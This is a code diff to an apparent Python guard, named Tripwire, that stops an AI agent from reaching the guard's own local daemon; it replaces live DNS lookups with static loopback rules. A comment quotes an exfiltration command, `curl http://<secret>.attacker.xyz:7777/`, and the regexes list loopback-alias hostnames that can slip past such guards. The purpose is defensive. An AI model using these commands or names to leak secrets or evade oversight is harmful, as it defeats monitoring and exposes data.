@@ -562,7 +562,9 @@ class Engine:
             m = self._port_re.search(text)
             if not m:
                 api = DAEMON_API.search(text)
-                if api and re.search(LOCAL_ADDR, text, re.I):
+                ports = "|".join(str(p) for p in sorted(self.guard_ports))
+                # Tripwire's own API path on a local address, or on the daemon's port under any name.
+                if api and (re.search(LOCAL_ADDR, text, re.I) or re.search(rf":0{{0,4}}(?:{ports})\b", text)):
                     m = api
             if not m and netty:
                 m = LOCAL_DYN_PORT.search(raw_text) or self._any_daemon_port(text)
@@ -609,9 +611,9 @@ class Engine:
         for m in re.finditer(rf"([^\s/:@'\"=]{{0,253}}):0{{0,4}}(?:{alt})\b", text):
             host = m.group(1).strip("[]")
             if PUBLIC_HOST.fullmatch(host) and not host.lower().endswith(("localhost", ".local", ".internal")):
-                # A public-looking name can still lead here (lvh.me, 127.0.0.1.nip.io, a hosts-file entry). The
-                # daemon's port on a name that resolves here, or that can't be resolved in time, counts as local.
-                if is_local_name(host) is False:
+                # A public-looking name can still lead here (lvh.me, 127.0.0.1.nip.io, a hosts-file entry): static
+                # rules only. Any other name is judged by where it came from, like every other host.
+                if not is_local_name(host):
                     continue
             return m
         return None
@@ -792,15 +794,42 @@ def _mentioned(s: Session, h: str):
     return None
 
 
-# Public DNS names that always lead back to this computer, so tests and offline machines agree with live DNS.
-LOOPBACK_DNS = re.compile(r"(?:^|\.)(?:lvh\.me|localtest\.me|vcap\.me|lacolhost\.com|fuf\.me|localho\.st|"
-                          r"local\.gd|readme\.localhost)$|(?:^|[.-])(?:127|0)[.-]\d{1,3}[.-]\d{1,3}[.-]\d{1,3}\."
-                          r"(?:nip\.io|sslip\.io|xip\.io|traefik\.me|nip\.direct)$|(?:^|[.-])7f[0-9a-f]{6}\.(?:nip|sslip)\.io$",
-                          re.I)
-_DNS_CACHE: dict[str, tuple[float, bool | None]] = {}
-_DNS_TTL = 60.0
-_DNS_TIMEOUT = 0.3
-_DNS_POOL = None
+# Public DNS names that always lead back to this computer (wildcard loopback services), and local-only suffixes.
+# The guard never looks a name up itself: a live lookup of an agent-chosen name is itself a way to leak data
+# (review 4: `curl http://<secret>.attacker.xyz:7777/` made the guard send the secret to the attacker's DNS).
+LOOPBACK_DNS = re.compile(
+    r"(?:^|\.)(?:lvh\.me|localtest\.me|vcap\.me|lacolhost\.com|fuf\.me|localho\.st|local\.gd|yoogle\.com|"
+    r"ulh\.me|smackaho\.st|readme\.localhost|localhost|local|internal)$|"
+    # nip.io-style services: any name that carries a loopback or unspecified address, in dots, dashes or hex.
+    r"(?:^|[.-])(?:127|0)[.-]\d{1,3}[.-]\d{1,3}[.-]\d{1,3}\.(?:nip\.io|sslip\.io|xip\.io|traefik\.me|nip\.direct|"
+    r"local\.gd|localtest\.me|lvh\.me)$|"
+    r"(?:^|[.-])(?:7f[0-9a-f]{6}|0{8})\.(?:nip\.io|sslip\.io|xip\.io|traefik\.me)$|"
+    r"(?:^|[.-])(?:--1|0--1|[0:-]{2,16}1)\.(?:sslip\.io|nip\.io)$",
+    re.I)
+_HOSTS_FILE = "/etc/hosts"
+_HOSTS: tuple[float, set[str]] = (0.0, set())
+
+
+def _hosts_file_local() -> set[str]:
+    """Names this machine's hosts file points at a loopback address (a local file, never the network)."""
+    global _HOSTS
+    try:
+        mtime = os.stat(_HOSTS_FILE).st_mtime
+    except OSError:
+        return set()
+    if _HOSTS[0] == mtime:
+        return _HOSTS[1]
+    names: set[str] = set()
+    try:
+        with open(_HOSTS_FILE, encoding="utf-8", errors="replace") as fh:
+            for line in fh.read(1_000_000).splitlines()[:20_000]:
+                parts = line.split("#", 1)[0].split()
+                if len(parts) >= 2 and _addr_is_local(parts[0]):
+                    names.update(p.lower().rstrip(".") for p in parts[1:])
+    except OSError:
+        return set()
+    _HOSTS = (mtime, names)
+    return names
 
 
 def _addr_is_local(addr: str) -> bool:
@@ -814,35 +843,19 @@ def _addr_is_local(addr: str) -> bool:
     return ip.is_loopback or ip.is_link_local or ip.is_unspecified
 
 
-def is_local_name(host: str) -> bool | None:
-    """Does `host` lead to this computer? True / False, or None if DNS did not answer in time. Cached for a minute."""
-    import socket
-    from concurrent.futures import ThreadPoolExecutor, TimeoutError as FutTimeout
-    global _DNS_POOL
-    h = host.strip("[]").rstrip(".").lower()
+def is_local_name(host: str) -> bool:
+    """Does `host` lead to this computer? Decided by static rules only: IP literals in any notation (dotted, one
+    number, hex, octal, IPv6, IPv4-mapped), localhost and *.localhost, local-only suffixes, wildcard loopback DNS
+    services (lvh.me, nip.io, sslip.io ...) and the hosts file. Never a DNS lookup."""
+    from .taint import _ip_from_parts
+    h = host.strip().strip("[]").rstrip(".").lower()
     if not h:
         return False
     if LOOPBACK_DNS.search(h) or re.fullmatch(LOCAL_ADDR, h, re.I) or _addr_is_local(h):
         return True
-    if re.fullmatch(r"[\d.]+|[0-9a-f:]+", h):
-        return False  # an address that is not local
-    now = time.time()
-    hit = _DNS_CACHE.get(h)
-    if hit and now - hit[0] < _DNS_TTL:
-        return hit[1]
-    if _DNS_POOL is None:
-        _DNS_POOL = ThreadPoolExecutor(max_workers=4, thread_name_prefix="tripwire-dns")
-    fut = _DNS_POOL.submit(socket.getaddrinfo, h, None)
-    try:
-        res: bool | None = any(_addr_is_local(ai[4][0]) for ai in fut.result(timeout=_DNS_TIMEOUT))
-    except FutTimeout:
-        res = None
-    except OSError:
-        res = False  # no such name: it can't lead anywhere
-    if len(_DNS_CACHE) > 4096:
-        _DNS_CACHE.clear()
-    _DNS_CACHE[h] = (now, res)
-    return res
+    if re.fullmatch(r"(?:0x[0-9a-f]{1,8}|\d{1,10})(?:\.(?:0x[0-9a-f]{1,8}|\d{1,10})){0,3}", h):
+        return _addr_is_local(_ip_from_parts(h))
+    return h in _hosts_file_local()
 
 
 def _resolver_tricks(text: str, ports: set[int]) -> str | None:
@@ -858,7 +871,7 @@ def _resolver_tricks(text: str, ports: set[int]) -> str | None:
     if m and re.search(r"(?:-H|--header|headers?)\b", text, re.I):
         return m.group(0)
     for m in re.finditer(r"(?:https?|wss?)://([a-z0-9.-]{1,253})(?::\s{0,3}[\"']?\s{0,2}(?:[$`{%(]|\+))", text, re.I):
-        if PUBLIC_HOST.fullmatch(m.group(1)) and is_local_name(m.group(1)) is not False:
+        if PUBLIC_HOST.fullmatch(m.group(1)) and is_local_name(m.group(1)):
             return m.group(0)
     return None
 
